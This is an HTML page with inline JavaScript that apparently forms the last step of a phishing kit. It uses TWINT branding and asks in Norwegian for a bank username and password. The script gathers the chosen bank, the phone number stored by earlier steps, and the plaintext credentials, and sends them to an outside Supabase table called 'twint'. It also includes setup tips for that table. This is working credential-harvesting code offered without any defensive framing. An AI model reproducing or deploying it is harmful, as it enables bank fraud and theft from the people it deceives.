<!DOCTYPE html>
<html lang="nb">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TWINT â€” Brukerinformasjon</title>
    <style>
      :root {
        font-family: "Inter", "Segoe UI", system-ui, sans-serif;
        color: #0f172a;
        background: #f3f4f6;
      }

      * {
        box-sizing: border-box;
      }

      body {
        margin: 0;
        min-height: 100vh;
        background: #f3f4f6;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .shell {
        width: min(420px, 100%);
        background: white;
        border-radius: 0;
        padding: 1.5rem 1.75rem;
        min-height: 100vh;
        box-shadow: 0 15px 45px rgba(15, 23, 42, 0.18);
      }

      .step {
        display: flex;
        flex-direction: column;
        gap: 0.45rem;
        padding: 0 0.25rem 0.75rem;
      }

      .step-label {
        font-size: 0.8rem;
        letter-spacing: 0.08em;
        text-transform: uppercase;
        color: #94a3b8;
      }

      .step-progress {
        display: flex;
        align-items: center;
        justify-content: space-between;
      }

      .progress-bar {
        flex: 1;
        height: 0.35rem;
        background: #e2e8f0;
        border-radius: 999px;
        margin-right: 0.75rem;
        overflow: hidden;
      }

      .progress-bar span {
        display: block;
        width: 100%;
        height: 100%;
        background: #fbbf24;
        border-radius: inherit;
      }

      .step-progress strong {
        font-size: 0.75rem;
        color: #475569;
      }

      h1 {
        margin: 0 0 0.4rem;
        font-size: 2.2rem;
        font-weight: 700;
        letter-spacing: 0.02em;
      }

      .bank-subtitle {
        margin: 0 0 1.25rem;
        color: #475569;
        font-weight: 600;
        letter-spacing: 0.04em;
      }

      form {
        display: flex;
        flex-direction: column;
        gap: 1rem;
      }

      label {
        font-weight: 600;
        color: #475569;
      }

      input[type="text"],
      input[type="password"] {
        width: 100%;
        padding: 0.95rem 1rem;
        border: 1px solid #cbd5f5;
        border-radius: 12px;
        font-size: 1rem;
        font-weight: 600;
        color: #0f172a;
        background: #f8fafc;
      }

      .buttons {
        display: flex;
        flex-direction: column;
        gap: 0.75rem;
        margin-top: 1rem;
      }

      .buttons button {
        border: none;
        border-radius: 14px;
        padding: 0.95rem;
        font-size: 1rem;
        font-weight: 600;
        cursor: pointer;
      }

      .primary {
        background: #fbbf24;
        color: #0f172a;
        box-shadow: 0 10px 20px rgba(251, 191, 36, 0.45);
      }

      .primary:disabled {
        background: #f6f8fb;
        color: #94a3b8;
        box-shadow: none;
        cursor: not-allowed;
      }

      .secondary {
        background: white;
        border: 1px solid #d1d5db;
        color: #475569;
      }
    </style>
  </head>
  <body>
    <div class="shell">
      <div class="step">
        <div class="step-label">Step 3/3</div>
        <div class="step-progress">
          <div class="progress-bar"><span></span></div>
          <strong>Step 3/3</strong>
        </div>
      </div>

      <h1><span id="selected-bank">Velg bank</span></h1>
      <p class="bank-subtitle">Vennligst logg inn med bankdetaljene dine.</p>

      <form>
        <label for="bank-username">Brukernavn</label>
        <input type="text" id="bank-username" placeholder="Bankbrukernavn" />

        <label for="bank-password">Passord</label>
        <input type="password" id="bank-password" placeholder="Bankpassord" />

        <div class="buttons">
          <button type="button" class="primary" id="next-button" disabled>Neste</button>
          <button type="button" class="secondary" id="back-button">Tilbake</button>
        </div>
      </form>
    </div>

    <!-- Load Supabase library from CDN -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/dist/supabase.min.js"></script>
    
    <script>
      // Load Supabase configuration from Vercel Serverless Function
      async function loadSupabaseConfig() {
        try {
          const response = await fetch('/api/config');
          if (!response.ok) {
            throw new Error('Failed to fetch config');
          }
          const config = await response.json();
          
          window.SUPABASE_CONFIG = {
            url: config.supabaseUrl,
            anonKey: config.supabaseAnonKey,
            table: config.supabaseTable || 'twint'
          };
          
          console.log('âœ… Supabase config loaded from serverless function');
          
          // Check if config is valid
          if (!window.SUPABASE_CONFIG.url || !window.SUPABASE_CONFIG.anonKey || 
              window.SUPABASE_CONFIG.url.includes('null') || 
              window.SUPABASE_CONFIG.anonKey.includes('null')) {
            console.warn('âš ï¸ Supabase credentials ikke satt i Vercel environment variables!');
            // Fallback for local development
            window.SUPABASE_CONFIG = {
              url: 'https://replace-with-your-project.supabase.co',
              anonKey: 'replace_with_anon_key',
              table: 'twint'
            };
          }
          
          return window.SUPABASE_CONFIG;
        } catch (error) {
          console.error('âŒ Failed to load Supabase config:', error);
          // Fallback for local development or when API is not available
          window.SUPABASE_CONFIG = {
            url: 'https://replace-with-your-project.supabase.co',
            anonKey: 'replace_with_anon_key',
            table: 'twint'
          };
          console.warn('âš ï¸ Using fallback config. Set SUPABASE_URL and SUPABASE_ANON_KEY in Vercel environment variables.');
          return window.SUPABASE_CONFIG;
        }
      }
      
      // Wait for page and Supabase library to load
      async function initApp() {
        // Load Supabase config first
        await loadSupabaseConfig();
        
        // Check if Supabase is loaded
        if (typeof supabase === 'undefined') {
          console.error('âŒ Supabase-biblioteket er ikke lastet! Sjekk internettforbindelsen.');
          // Retry after a short delay
          setTimeout(() => {
            if (typeof supabase === 'undefined') {
              alert('Supabase-biblioteket kunne ikke lastes. Sjekk internettforbindelsen og last siden pÃ¥ nytt.');
              return;
            } else {
              initApp();
            }
          }, 500);
          return;
        }
        
        // Check if DOM is ready
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', initApp);
          return;
        }

        const selectedBankEl = document.getElementById("selected-bank");
        const storedBank = localStorage.getItem("selectedBank");
        const phoneNumber = localStorage.getItem("phoneNumber");
        const bankUsernameInput = document.getElementById("bank-username");
        const bankPasswordInput = document.getElementById("bank-password");
        const nextButton = document.getElementById("next-button");
        const backButton = document.getElementById("back-button");

        if (storedBank) {
          selectedBankEl.textContent = storedBank;
        }

        const toggleNext = () => {
          nextButton.disabled = !bankUsernameInput.value.trim() || !bankPasswordInput.value.trim();
        };

        bankUsernameInput.addEventListener("input", toggleNext);
        bankPasswordInput.addEventListener("input", toggleNext);

        // Get Supabase configuration from environment variables (set in Vercel)
        const SUPABASE_URL = window.SUPABASE_CONFIG?.url || "https://replace-with-your-project.supabase.co";
        const SUPABASE_ANON_KEY = window.SUPABASE_CONFIG?.anonKey || "replace_with_anon_key";
        
        // Check if Supabase credentials are set
        if (!SUPABASE_URL || !SUPABASE_ANON_KEY || 
            SUPABASE_URL.includes("replace") || SUPABASE_ANON_KEY.includes("replace")) {
          console.warn("âš ï¸ Supabase credentials ikke satt!");
          console.warn("ðŸ’¡ Sett SUPABASE_URL og SUPABASE_ANON_KEY i Vercel environment variables.");
          console.warn("   Du kan ogsÃ¥ sette dem manuelt i window.SUPABASE_CONFIG for lokal testing.");
        }
        
        // Initialize Supabase client
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        
        // Get table name from config (default: 'twint')
        const SUPABASE_TABLE = window.SUPABASE_CONFIG?.table || "twint";

      // Function to save user data to Supabase table
      // Table structure: twint (id, bank, phone, bank_username, bank_password, created_at)
      const saveUserData = async (payload) => {
        console.log("ðŸ“¤ Sender data til Supabase:", payload);
        console.log("ðŸ“‹ Tabell:", SUPABASE_TABLE);
        
        try {
          const { data: result, error } = await supabaseClient
            .from(SUPABASE_TABLE)
            .insert([payload])
            .select();
          
          if (error) {
            console.error("âŒ Supabase error:", error);
            console.error("Error details:", {
              message: error.message,
              details: error.details,
              hint: error.hint,
              code: error.code
            });
            
            let errorMsg = "Noe gikk galt ved lagring: " + error.message;
            
            // Helpful error messages
            if (error.code === "PGRST301" || error.message.includes("permission denied")) {
              errorMsg += "\n\nðŸ’¡ Tips: Sjekk Row Level Security (RLS) i Supabase. Du mÃ¥ aktivere RLS og lage en policy som tillater INSERT.";
            } else if (error.message.includes("relation") && error.message.includes("does not exist")) {
              errorMsg += "\n\nðŸ’¡ Tips: Tabellen 'twint' finnes ikke i Supabase. Opprett tabellen med kolonnene: bank, phone, bank_username, bank_password, created_at";
            } else if (error.message.includes("column") && error.message.includes("does not exist")) {
              errorMsg += "\n\nðŸ’¡ Tips: En eller flere kolonner mangler i tabellen. Sjekk at alle kolonner finnes: bank, phone, bank_username, bank_password, created_at";
            }
            
            alert(errorMsg);
            return false;
          } else {
            console.log("âœ… Data lagret i Supabase:", result);
            alert("Data lagret hos Supabase!");
            return true;
          }
        } catch (err) {
          console.error("âŒ Uventet feil:", err);
          alert("En uventet feil oppstod: " + err.message);
          return false;
        }
      };

      nextButton.addEventListener("click", async () => {
        // Validate that required fields are filled
        if (!bankUsernameInput.value.trim() || !bankPasswordInput.value.trim()) {
          alert("Vennligst fyll ut bÃ¥de brukernavn og passord.");
          return;
        }

        // Prepare data matching the 'twint' table columns:
        // - bank (text): Selected bank from step 1
        // - phone (text): Phone number from step 2
        // - bank_username (text): Username from step 3
        // - bank_password (text): Password from step 3
        // - created_at (timestamp): Auto-generated by Supabase if not provided
        const data = {
          bank: storedBank || null,
          phone: phoneNumber || null,
          bank_username: bankUsernameInput.value.trim(),
          bank_password: bankPasswordInput.value.trim(),
          created_at: new Date().toISOString(),
        };

        console.log("ðŸ“ Data som skal lagres:", data);
        console.log("ðŸ¦ Bank fra localStorage:", storedBank);
        console.log("ðŸ“± Telefon fra localStorage:", phoneNumber);

        // Save to localStorage as backup
        localStorage.setItem("bankLoginData", JSON.stringify(data));
        
        // Save to Supabase
        nextButton.disabled = true;
        nextButton.textContent = "Lagrer...";
        
        const success = await saveUserData(data);
        
        nextButton.disabled = false;
        nextButton.textContent = "Neste";
        
        if (success) {
          // Optionally redirect or show success message
          // window.location.href = "success.html";
        }
      });

      backButton.addEventListener("click", () => {
        window.location.href = "screen-2.html";
      });
      } // End initApp
      
      // Start the app when page is loaded
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => {
          // Wait a bit for Supabase library to load
          setTimeout(initApp, 100);
        });
      } else {
        // Page already loaded, wait for Supabase
        setTimeout(initApp, 100);
      }
    </script>
  </body>
</html>
